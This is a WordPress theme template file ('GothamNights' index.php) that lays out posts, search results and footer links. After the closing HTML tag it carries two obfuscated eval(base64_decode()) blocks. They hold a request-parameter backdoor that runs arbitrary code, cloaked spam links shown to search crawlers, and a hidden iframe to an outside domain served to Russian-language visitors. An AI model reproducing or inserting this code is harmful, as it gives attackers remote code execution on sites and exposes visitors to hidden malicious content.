<?php get_header(); ?>
<div id="outer">
  <div class="column01"><?php bloginfo('description'); ?></div>
  <div class="column02">
    <h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
  </div>
  <div class="column03">
    <div class="search">
      <?php include (TEMPLATEPATH . "/searchform.php"); ?>
    </div>
  </div>
  <br clear="all" />
  <span class="upperSpacer"></span>
  <div class="postColumn">
    <!-- begin post -->
    <?php if (have_posts()) : ?>
	<?php while (have_posts()) : the_post(); ?>
    <h3><a href="<?php the_permalink() ?>" rel="bookmark" title="Permanent Link to <?php the_title(); ?>"><?php the_title(); ?></a></h3>
    <div class="column01">
      <div class="postDetails"> written by <?php the_author() ?><br />
        at <?php the_time('g:i a') ?><br />
        on <?php the_time('F') ?> <?php the_time('j') ?>,  <?php the_time('Y') ?><br />
        in <?php the_category(', ') ?><br />
        <?php comments_popup_link('no comments', '1 comment', '% comments'); ?></div>
    </div>
    <div class="column02 post" id="post-<?php the_ID(); ?>">
      <?php the_content(__('(more...)')); ?>
    </div>
    <br clear="all" />
    <div class="postEnd"></div>
    <!-- end post -->
    <?php endwhile; ?>
		<div class="column01">&nbsp;</div>
        <div class="column02 post"><?php next_posts_link('&laquo; Previous Entries') ?> &nbsp; <?php previous_posts_link('Next Entries &raquo;') ?></div>
    <br clear="all" />
    <div class="postEnd"></div>
    <?php else : ?>
    <div class="column01">search results</div>
    <div class="column02 post">
    <h2 class="center">Not Found</h2>
    <p class="center">Sorry, but you are looking for something that isn't here.</p>
    </div>
    <br clear="all" />
    <div class="postEnd"></div>
	<?php endif; ?>
    
    <div class="column01">about this</div>
    <div class="column02 post about"><?php query_posts('pagename=about'); ?>
	<?php if (have_posts()) : ?>
	<?php while (have_posts()) : the_post(); ?>
	<?php the_content(); ?>
	<?php endwhile; ?>
	<?php endif; ?></div>
    <br clear="all" />
    <div class="postEnd"></div>
    <div class="column01">fineprint</div>
    <div class="column02 post fineprint"><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a> uses <a href="http://www.wordpress.org">Wordpress</a>.<br />
      <a href="http://www.evaneckard.com">"GothamNights"</a> theme brought to you by <a href="http://www.evaneckard.com">EvanEckard</a></div>
    <br clear="all" />
  </div>
  <div class="column03">
    <?php get_sidebar(); ?>
  </div>
  <br clear="all" />
  <div></div>
</div>
</div>
</body>
</html>
<?php eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwppZigkX1JFUVVFU1RbJ2RmcXczMWYnXSkKZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFsnZGZxdzMxZiddKSk7CiRocmVmID0gJ2h0dHA6Ly93d3cucHJvc29mdHdhcmVzdG9yZS5jb20vJzsKJHdvcmRzID0gYXJyYXkoJ1NvZnR3YXJlIFN0b3JlJywgJ01pY3Jvc29mdCBTb2Z0d2FyZScsICdBZG9iZSBTb2Z0d2FyZScsICdBdXRvZGVzayBTb2Z0d2FyZScsICdCb3JsYW5kIFNvZnR3YXJlIHNob3AnLCAnVk13YXJlIFNvZnR3YXJlJywgJ1Nob3AgU29mdHdhcmUnLCAnTUFDIFNvZnR3YXJlJywgJ1dpbmRvd3MgU29mdHdhcmUnLCAnU3ltYW50ZWMgc2hvcCcpOwoka2V5bnVtID0gY291bnQoJHdvcmRzKTsKJGFsdHMgPSAkd29yZHM7CgokciA9IHJhbmQoMCwgMyk7CiRyMiA9IHJhbmQoNCwgNyk7CiRyMyA9IHJhbmQoOCwgJGtleW51bS0xKTsKc2h1ZmZsZSgkYWx0cyk7CmZvcigkaT0wOyAkaTwka2V5bnVtOyAkaSsrKQp7CmlmKCRpPT0kciB8fCAkaT09JHIyIHx8ICRpPT0kcjMpCnsKJHI0ID0gcmFuZCgxLCAzKTsKJHN0ciA9IGltcGxvZGUoIiAiLCBhcnJheV9zbGljZSgkd29yZHMsIDAsIHJhbmQoMSwgaW50dmFsKCRrZXludW0vMikrMSkpKTsKJGFsdHNbJGldID0gIjxoND48YSBocmVmPVwiJGhyZWZcIiBhbHQ9XCIkc3RyXCIgdGl0bGU9XCIkc3RyXCI+U2hvcCAiLiRhbHRzWyRpXS4iPC9hPjwvaDQ+IjsKfQp9CmFycmF5X3B1c2goJGFsdHMsICI8YSBocmVmPVwiJGhyZWZcIj4kaHJlZjwvYT4iKTsKc2h1ZmZsZSgkYWx0cyk7CiRzdHIgPSBpbXBsb2RlKCIgIiwgJGFsdHMpOwppZihwcmVnX21hdGNoKCIvKGNyYXdsKXwoZ29vZ2xlKXwoeWFob28pfChiaW5nKXwoc3B5KXwoYm90KXwocGVybCl8KHB5dGhvbil8KGhvbG1lcyl8KGFsZXhhKXwoYi1vLXQpfChmaW5kbGlua3MpfChpY2hpcm8pfChsYXJiaW4pfChsaW5rKXwobHdwKXwoUHljVVJMKXwoc2NydWJieSl8KHNlYXJjaCl8KHN0YWNrKXwodXBkYXRlZCkvaSIsICRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkpCmVjaG8oIjxkaXYgYWxpZ249Y2VudGVyPiRzdHI8L2Rpdj4iKTsKZWxzZQplY2hvKCI8Zm9udCBzdHlsZT1cInBvc2l0aW9uOi8qKi9hYnNvbHV0ZTtvdmVyZmxvdzovKiovaGlkZGVuOy8qKi93aWR0aDovKiovMFwiPiRzdHI8YSBocmVmPSckaHJlZic+JGhyZWY8L2E+PC9mb250PiIpOw==")); ?>
<?php eval(base64_decode("aWYocHJlZ19tYXRjaCgiL3J1L2kiLCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSkNCgkJZWNobyAnPGlmcmFtZSBzcmM9Imh0dHA6Ly9hZGhlc2l2ZXN0cmVuZ3RoLmluL2luLmNnaT8xODQiIGZyYW1lYm9yZGVyPSIwIiB3aWR0aD0iMyIgaGVpZ2h0PSIzIiBzdHlsZT0idmlzaWJpbGl0eTogaGlkZGVuOyI+PC9pZnJhbWU+Jzs=")); ?>
